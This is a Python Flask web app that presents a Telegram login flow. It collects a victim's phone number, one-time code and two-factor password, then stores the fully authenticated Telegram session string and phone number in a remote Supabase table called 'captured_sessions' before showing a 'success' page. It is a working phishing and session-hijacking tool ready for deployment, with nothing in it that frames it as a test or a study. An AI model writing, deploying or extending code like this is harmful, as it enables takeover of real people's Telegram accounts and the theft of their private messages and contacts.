import os
import asyncio
from flask import Flask, render_template, request, redirect, url_for, session
from telethon import TelegramClient
from telethon.sessions import StringSession
# --- THE FIX: Import the specific errors we need to catch ---
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from supabase import create_client, Client

# --- SECURE SETUP FOR DEPLOYMENT ---
# These keys will be read from Render's Environment Variables, not from the code.

# Supabase Keys
SUPABASE_URL = os.environ.get('SUPABASE_URL')
SUPABASE_KEY = os.environ.get('SUPABASE_KEY')
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# Telegram Keys (Note: API_ID is converted to an integer)
api_id = int(os.environ.get('API_ID'))
api_hash = os.environ.get('API_HASH')

app = Flask(__name__)
# The Flask secret key should also be an environment variable
app.secret_key = os.environ.get('FLASK_SECRET_KEY')

# --- THE REST OF THE APP (No logic changes needed) ---

def run_async(coro):
    return asyncio.run(coro)

@app.route('/')
def index():
    session.clear()
    return render_template('login.html', step='enter_phone')

@app.route('/send_otp', methods=['POST'])
def send_otp():
    phone = request.form['phone']
    session['phone'] = phone

    async def send_code_async():
        client = TelegramClient(StringSession(), api_id, api_hash)
        await client.connect()
        try:
            result = await client.send_code_request(phone)
            session['phone_code_hash'] = result.phone_code_hash
            session['telethon_session'] = client.session.save()
        finally:
            await client.disconnect()

    run_async(send_code_async())
    return render_template('login.html', step='enter_code', phone=phone)

@app.route('/login', methods=['POST'])
def login():
    phone = session.get('phone')
    phone_code_hash = session.get('phone_code_hash')
    telethon_session = session.get('telethon_session')
    
    code = request.form.get('code')
    password = request.form.get('password')

    if not telethon_session or not phone:
        return redirect(url_for('index'))

    async def try_login_async():
        client = TelegramClient(StringSession(telethon_session), api_id, api_hash)
        await client.connect()
        try:
            if code:
                await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            elif password:
                await client.sign_in(password=password)
        
        # --- THE FIX: Catch the specific error for a wrong OTP ---
        except PhoneCodeInvalidError:
            await client.disconnect()
            # Re-render the OTP page but pass an error message to display
            return render_template('login.html', 
                                   step='enter_code', 
                                   phone=phone, 
                                   error="Invalid code. Please try again.")
        # --- END OF FIX ---

        except SessionPasswordNeededError:
            session['telethon_session'] = client.session.save()
            await client.disconnect()
            return render_template('login.html', step='enter_password', phone=phone)
        except Exception as e:
            await client.disconnect()
            return f"<h1>An Error Occurred</h1><p>{e}</p>"
        
        final_session_string = client.session.save()
        await client.disconnect()
        session.clear()
        
        try:
            data_to_insert = {
                "session_string": final_session_string, 
                "phone_number": phone
            }
            data, count = supabase.table('captured_sessions').insert(data_to_insert).execute()
            print("✅ Successfully saved session AND phone number to Supabase!")
        except Exception as e:
            print(f"❌ Error saving to Supabase: {e}")
            
        return render_template('business_success.html')

    return run_async(try_login_async())

# This block is not used by gunicorn but is good practice
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
